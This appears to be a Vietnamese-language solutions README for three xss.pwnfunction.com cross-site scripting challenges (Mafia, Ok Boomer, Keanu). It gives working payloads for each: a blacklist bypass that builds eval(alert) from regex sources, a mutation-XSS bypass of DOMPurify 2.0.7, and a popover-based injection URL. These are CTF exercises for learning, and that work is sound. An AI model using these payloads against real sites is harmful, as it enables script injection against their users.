<h1 align="center"> xss.pwnfunction.com </h1>
<hr />

## Mafia
Bypass blacklist bằng cách concat string.

> Payload

```js
eval(/aler/.source.concat(/t(1337)/.source))
```

## Ok, Boomer

Bug của DOMPurify version `2.0.7` có thể khai thác bằng XSS Mutation:
> Payload

```html
<math><mtext>
</form><form>
<mglyph>
<style></math><img src onerror=alert(1337)>
```

## Keanu

- Lợi dụng `popover show` để append DOM vào `number#number` thông qua `data-container`
- Ghi đè `#keanu` để trigger `popover show`
- Bypass chèn payload vào `number#number` thành một đoạn js code hợp lệ

> Payload

```
https://sandbox.pwnfunction.com/challenges/keanu.html?name=<button id="keanu" data-container="number#number" class="btn btn-primary btn-sm" data-toggle="popover" data-content="';alert(1337);//"></button>&number='
```
